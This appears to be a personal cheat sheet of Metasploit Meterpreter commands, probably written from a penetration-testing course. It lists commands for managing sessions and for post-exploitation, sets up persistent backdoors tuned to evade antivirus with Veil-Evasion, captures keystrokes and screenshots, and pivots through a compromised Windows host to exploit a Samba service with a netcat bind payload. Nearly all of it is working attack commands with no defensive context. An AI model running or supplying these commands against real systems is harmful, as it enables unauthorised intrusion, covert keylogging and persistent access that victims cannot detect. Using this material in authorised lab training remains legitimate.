# Meterpreter

Meterpreter is a tool inside Metasploit framework that we can use for exploits execution and target connections.

```
use exploit/multi/handler
show options
exploit
```

## Basics

Once we have access to a target machine, we can lots of useful commands.

```
background // set current session in the background
sessions -l // list all active sessions
sessions -i <ID> // access session by id
sessions -K // kill all sessions
sysinfo
ipconfig
ps
migrate <PROCESS_ID> // migrate meterpreter process to an specific running process on target machine
```

### File System commands

```
pwd
ls
cd
cat
download
upload
execute -f
```

### Maintaining Access

#### Using Veil-Evasion

* rev_http_service / rev_tcp_service
* use it instead of a normal backdoor
* set it to execute on start

#### Persistence module

Detectable by antivirus programs.

```
run persistence -U -i 20 -p 80 -r <IP>
```

#### Metasploit + Veil-Evasion

More robust and less detectable by antivirus programs.

```
use exploit/windows/local/persistence
show options
sessions -l
set session <SESSION_ID>
show advanced
set exe::custom <BACKDOOR_LOCATION>   # instead of generating a payload exe, use a custom one set with Veil-Evasion
exploit # it doesn't matter if you are not listening, target will keep trying to connect
```

### Capturing keystrokes

You only need to run one command while listening with the _handler_.

```
meterpreter > keyscan_start
```

And to see everything that has been recorded:

```
meterpreter > keyscan_dump
```

### Capturing screenshoots

```
meterpreter > screenshoot
```

### Pivoting

Example of attacking a Metasploitable machine through a compromised Windows system

```
ifconfig # see target computers network
background

# Gain access to target device's network connected devices
use post/windows/manage/autoroute
show options
set subnet <SUBNET> # X.X.X.0, reason from windows LAN IP
set session <SESSION_ID> # remember you can look at this with `sessions -l`
exploit

# Exploit previously unreachable target
use exploit/multi/samba/usermap_script
show options
SET RHOST <TARGET_IP> # you can now reach target's network connected devices
show payloads
set PAYLOAD cmd/unix/bind-netcat
```
